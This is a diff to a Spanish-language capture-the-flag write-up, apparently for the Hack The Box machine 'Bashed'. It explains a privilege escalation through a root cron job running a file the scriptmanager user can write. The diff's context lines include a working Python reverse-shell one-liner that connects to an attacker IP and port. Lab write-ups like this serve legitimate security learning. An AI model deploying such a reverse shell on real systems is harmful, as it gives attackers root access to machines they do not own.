@@ -104,8 +104,12 @@ pspy32s
 
 Si vemos tiene el UID en cero lo que nos indica que root esta corriendo ese comando.
 
+![image](https://github.com/gecr07/Bashed-HTB/assets/63270579/e63c0eda-4b2b-4599-852a-565ec9733d1f)
+
+Podemos observar que el archivo se puede escribir por el usuario que somos scriptmanager.
+
 ```
-Se ejecutara cada minuto y nos regresa una reverse shell con permisos de root.**9**
+Se ejecutara cada minuto y nos regresa una reverse shell con permisos de root.
 
 echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.74",4444)); 
 os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' > test.py
